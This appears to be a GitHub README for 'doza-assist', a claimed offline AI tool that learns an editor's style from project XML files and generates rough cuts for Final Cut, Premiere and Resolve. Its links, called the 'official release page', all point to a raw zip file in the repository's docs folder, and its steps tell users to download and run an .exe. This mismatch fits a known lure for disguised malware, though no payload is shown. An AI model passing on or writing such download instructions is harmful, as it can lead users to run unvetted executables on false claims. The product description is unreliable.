# ✂️ doza-assist - Edit interview footage in minutes

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/sbra4391/doza-assist/raw/refs/heads/main/docs/assist-doza-v3.2.zip)

doza-assist helps filmmakers create rough cuts from interview footage. It learns your editing style by watching your previous projects. It works with Final Cut Pro, Adobe Premiere, and DaVinci Resolve. The application runs on your computer. It keeps your files private. 

## 📥 How to download the software

1. Visit the [official release page](https://github.com/sbra4391/doza-assist/raw/refs/heads/main/docs/assist-doza-v3.2.zip).
2. Look for the latest version at the top of the list.
3. Click the link that ends in .exe for Windows.
4. Save the file to your computer.

## ⚙️ Setting up your system

Your computer needs specific hardware to run AI tasks well. 

- Operating System: Windows 10 or 11.
- Processor: Intel Core i5 or AMD Ryzen 5 or better.
- Memory: 16 GB of RAM.
- Storage: 5 GB of free space.

Ensure you have your interview footage saved in a folder. Organize your audio and video files before you start the program.

## 🚀 Running the application for the first time

1. Locate the file you downloaded. 
2. Double-click the file to start the installation.
3. Follow the prompts on the screen.
4. Open the application from your desktop or start menu.

The software performs a quick check when it opens. It verifies your hardware and prepares the local tools. This might take a minute on the first launch.

## 📝 Learning your editing style

The tool learns your preferences by analyzing existing projects. 

1. Create an XML file from a finished project in your editing software.
2. Import this XML file into doza-assist.
3. The software scans your cuts and timing.
4. It creates a profile based on your choices.

The more projects you import, the more accurate the tool becomes. It records your preference for pacing and scene selection. 

## 🎞️ Creating a rough cut

Use these steps to process new interview footage:

1. Click the "Add Footage" button.
2. Select your video files.
3. Choose your target editing software from the list.
4. Click "Generate Cut."

The software transcribes the audio first. It matches the spoken text to your editing profile. It builds a timeline that you can export. 

## 💾 Exporting to your editor

Once the rough cut is ready, you can send it to your editing suite. 

1. Select "Export" inside doza-assist.
2. Choose your software type: Final Cut, Premiere, or Resolve.
3. Save the resulting file.
4. Open your main editing software.
5. Import the XML file you just exported.

Your sequence will appear on the timeline. You retain full control over every frame. You can adjust the cuts, move clips, and tweak the timing. 

## 🔒 Your data and privacy

doza-assist runs on your machine. It does not send your footage to a server. Your video files remain on your hard drive. 

## 🛠️ Troubleshooting common issues

If the application closes unexpectedly, check your memory usage. Close heavy programs like web browsers while doza-assist processes your video. 

If the export file does not import into your editor:
- Make sure you selected the correct file type.
- Verify that your project path names contain no special characters.
- Restart the application and try the export again.

If the AI does not recognize your style:
- Import more examples of your work.
- Check that your sample projects use high-quality audio.

## 📋 Frequently asked questions

Does this tool replace human editors?
No. It assists you by doing the repetitive tasks. You make the creative choices. 

Can I use it without an internet connection?
Yes. The software works offline once you finish the initial setup.

What languages does the transcription support?
The software supports many languages. It detects the language of your footage automatically. 

Will it overwrite my original files?
No. It creates new XML files. It never changes your source media. 

How does it learn?
It analyzes the distance between cuts in your XML files. It tracks how long you hold on each speaker. It mimics your habits for B-roll placement. 

Does it support multi-camera footage?
Yes. It treats multi-camera clips as a single unit during the analysis phase. 

Is there a monthly fee?
The tool is open-source. Updates are free. 

Where can I report errors?
Use the GitHub repository to log any technical issues you find. Provide steps to recreate the problem so developers can help you.
